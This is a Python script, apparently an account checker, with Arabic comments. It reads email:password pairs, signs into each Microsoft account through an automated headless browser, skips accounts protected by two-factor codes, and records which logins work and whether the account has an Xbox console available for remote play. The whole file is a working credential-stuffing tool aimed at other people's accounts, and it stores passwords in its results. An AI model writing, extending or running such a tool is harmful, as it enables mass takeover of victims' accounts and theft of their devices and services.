# xbox_checker.py
import asyncio
from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeoutError
from typing import Dict, List, Tuple
from datetime import datetime
import re

DEFAULT_TIMEOUT = 120000  # 120 ثانية

async def safe_fill(page, selector, value, timeout=10000):
    """محاولة ملء الحقل بأمان"""
    try:
        await page.wait_for_selector(selector, timeout=timeout)
        await page.fill(selector, value)
        return True
    except:
        return False

async def safe_click(page, selector, timeout=10000):
    """محاولة النقر بأمان"""
    try:
        await page.wait_for_selector(selector, timeout=timeout)
        await page.click(selector)
        return True
    except:
        return False

async def handle_signin(page, email, password):
    """معالجة تسجيل الدخول بشكل كامل مع إعادة محاولات"""
    # 1. الذهاب إلى صفحة تسجيل الدخول المباشرة
    await page.goto("https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=16&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2fwww.xbox.com%2fen-US%2fplay%2fconsoles&id=292540", timeout=DEFAULT_TIMEOUT)
    await page.wait_for_load_state("networkidle")
    await asyncio.sleep(2)

    # 2. إدخال البريد الإلكتروني
    email_selector = "input[type='email'], input[name='loginfmt']"
    if not await safe_fill(page, email_selector, email, timeout=15000):
        return False, "لم يتم العثور على حقل البريد الإلكتروني"

    # 3. النقر على زر التالي
    next_selectors = ["input[type='submit']", "input[value='Next']", "button:has-text('Next')", "button:has-text('التالي')"]
    clicked = False
    for sel in next_selectors:
        if await safe_click(page, sel, timeout=5000):
            clicked = True
            break
    if not clicked:
        return False, "لم يتم العثور على زر التالي"

    await page.wait_for_load_state("networkidle")
    await asyncio.sleep(3)

    # 4. التحقق من وجود 2FA أو أي تحدي
    body = await page.inner_text('body')
    if re.search(r'(enter code|verification code|authenticator|code\s*\d{6}|تحقق|رمز)', body, re.I):
        return False, "يتطلب رمز تحقق (2FA) - تم التخطي"

    # 5. إدخال كلمة المرور - قد يكون الحقل موجوداً مباشرة أو بعد النقر على "Use password"
    password_selectors = ["input[type='password']", "input[name='passwd']"]
    password_filled = False
    for sel in password_selectors:
        if await safe_fill(page, sel, password, timeout=10000):
            password_filled = True
            break

    if not password_filled:
        # محاولة النقر على "Use password" أو "Enter password"
        use_pwd_selectors = ["button:has-text('Use password')", "button:has-text('Enter password')", "a:has-text('Use password')"]
        for sel in use_pwd_selectors:
            if await safe_click(page, sel, timeout=3000):
                await asyncio.sleep(2)
                for sel2 in password_selectors:
                    if await safe_fill(page, sel2, password, timeout=5000):
                        password_filled = True
                        break
            if password_filled:
                break

    if not password_filled:
        return False, "لم يتم العثور على حقل كلمة المرور"

    # 6. النقر على زر تسجيل الدخول
    signin_selectors = ["input[type='submit']", "button[type='submit']", "button:has-text('Sign in')", "button:has-text('تسجيل الدخول')"]
    clicked = False
    for sel in signin_selectors:
        if await safe_click(page, sel, timeout=5000):
            clicked = True
            break
    if not clicked:
        await page.keyboard.press("Enter")

    await page.wait_for_load_state("networkidle")
    await asyncio.sleep(4)

    # 7. التعامل مع "Stay signed in?"
    try:
        stay_selectors = ["input[value='Yes']", "button:has-text('Yes')", "button:has-text('نعم')"]
        for sel in stay_selectors:
            if await page.locator(sel).count() > 0:
                await page.click(sel)
                break
    except:
        pass

    # 8. التحقق من نجاح تسجيل الدخول (هل تم توجيهه إلى Xbox)
    current_url = page.url
    if "xbox.com" in current_url or "consoles" in current_url:
        return True, "تم تسجيل الدخول بنجاح"
    else:
        # فحص وجود رسائل خطأ
        body = await page.inner_text('body')
        if "incorrect password" in body.lower() or "wrong password" in body.lower():
            return False, "كلمة مرور خاطئة"
        if "account doesn't exist" in body.lower() or "couldn't find" in body.lower():
            return False, "الحساب غير موجود"
        return False, "تسجيل الدخول فشل لسبب غير معروف"

async def check_console_availability(page) -> Tuple[bool, str]:
    """التحقق من وجود جهاز Xbox بعد تسجيل الدخول"""
    try:
        await page.goto("https://www.xbox.com/en-US/play/consoles", timeout=60000)
        await page.wait_for_load_state("networkidle")
        await asyncio.sleep(2)
        text = (await page.inner_text('body')).lower()
        if "play your console remotely" in text:
            return True, "يوجد جهاز (يمكن اللعب عن بعد)"
        if "set up your console" in text:
            return False, "مسجل ولا يوجد جهاز"
        if "sign in to finish setting up" in text:
            return False, "تسجيل دخول غير مكتمل"
        if "no consoles found" in text:
            return False, "لا توجد أجهزة مسجلة"
    except Exception as e:
        return False, f"خطأ في فحص الجهاز: {str(e)[:50]}"
    return False, "لم يتم العثور على جهاز"

async def process_account(account: Dict, headless: bool = True) -> Dict:
    result = {
        'email': account['email'],
        'password': account['password'],
        'success': False,
        'has_console': False,
        'console_info': '',
        'timestamp': datetime.now().isoformat()
    }
    p = None
    try:
        p = await async_playwright().start()
        browser = await p.chromium.launch(
            headless=headless,
            args=[
                '--no-sandbox',
                '--disable-dev-shm-usage',
                '--disable-gpu',
                '--disable-setuid-sandbox',
                '--disable-accelerated-2d-canvas',
                '--disable-background-timer-throttling',
                '--disable-backgrounding-occluded-windows',
                '--disable-breakpad',
                '--disable-component-extensions-with-background-pages',
                '--disable-features=TranslateUI,BlinkGenPropertyTrees',
                '--disable-ipc-flooding-protection',
                '--disable-renderer-backgrounding',
                '--enable-features=NetworkService,NetworkServiceInProcess',
                '--force-color-profile=srgb',
                '--hide-scrollbars',
                '--metrics-recording-only',
                '--mute-audio',
                '--no-first-run',
                '--no-default-browser-check',
                '--no-pings',
                '--password-store=basic',
                '--use-mock-keychain'
            ]
        )
        context = await browser.new_context(
            viewport={'width': 1280, 'height': 720},
            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0'
        )
        page = await context.new_page()
        
        # محاولة تسجيل الدخول مع إعادة المحاولة مرة واحدة
        success, msg = await handle_signin(page, account['email'], account['password'])
        
        if not success:
            result['console_info'] = msg
            await browser.close()
            await p.stop()
            return result
        
        # التحقق من وجود جهاز
        has_console, console_info = await check_console_availability(page)
        result['success'] = True
        result['has_console'] = has_console
        result['console_info'] = console_info
        
        await browser.close()
        await p.stop()
        
    except PlaywrightTimeoutError:
        result['console_info'] = "انتهت المهلة أثناء تسجيل الدخول (قد يكون الموقع بطيئاً أو محظوراً)"
    except Exception as e:
        result['console_info'] = f"خطأ: {str(e)[:100]}"
        if p:
            await p.stop()
    return result

def parse_accounts_from_text(content: str) -> List[Dict]:
    accounts = []
    for line in content.splitlines():
        line = line.strip()
        if ':' in line and not line.startswith('#'):
            email, pwd = line.split(':', 1)
            accounts.append({'email': email.strip(), 'password': pwd.strip()})
    return accounts
